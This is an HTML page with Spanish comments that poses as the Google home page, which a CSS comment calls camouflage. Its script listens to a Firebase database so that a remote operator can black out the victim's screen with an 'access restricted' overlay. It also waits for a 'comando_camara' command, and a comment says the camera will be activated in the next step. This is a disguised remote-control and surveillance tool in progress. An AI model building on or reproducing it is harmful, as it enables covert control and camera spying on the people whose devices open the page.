<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { margin: 0; font-family: arial, sans-serif; background: white; }
        /* Pantalla de Bloqueo */
        #bloqueo { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: black; z-index: 9999; justify-content: center; align-items: center; 
        }
        /* Interfaz de Google (Camuflaje) */
        .google-home { display: flex; flex-direction: column; align-items: center; padding-top: 100px; }
        .logo { width: 160px; margin-bottom: 20px; }
        .search-bar { 
            width: 90%; max-width: 580px; border: 1px solid #dfe1e5; 
            padding: 10px 20px; border-radius: 24px; font-size: 16px; outline: none;
        }
    </style>
</head>
<body>

    <div id="bloqueo">
        <h1 style="color:red; font-size: 24px;">⚠️ ACCESO RESTRINGIDO</h1>
    </div>

    <div class="google-home">
        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        <input type="text" class="search-bar" placeholder="Buscar en Google o escribir URL">
        <p style="color:#70757a; font-size: 14px; margin-top: 20px;">Google ofrecido en: Español (Latinoamérica)</p>
    </div>

    <script>
        const config = { databaseURL: "https://micontrol-30a70-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();

        db.ref('bloqueo').on('value', (snap) => {
            if (snap.val() === "SI") {
                document.getElementById('bloqueo').style.display = "flex";
            } else {
                document.getElementById('bloqueo').style.display = "none";
            }
        });

        // ESCUCHADOR PARA LA CÁMARA (Siguiente paso)
        db.ref('comando_camara').on('value', (snap) => {
            if (snap.val() === "ABRIR") {
                // Aquí activaremos la cámara en el siguiente paso
                alert("Iniciando servicio de cámara..."); 
                db.ref('comando_camara').set("ESPERA"); // Resetea el comando
            }
        });
    </script>
</body>
</html>
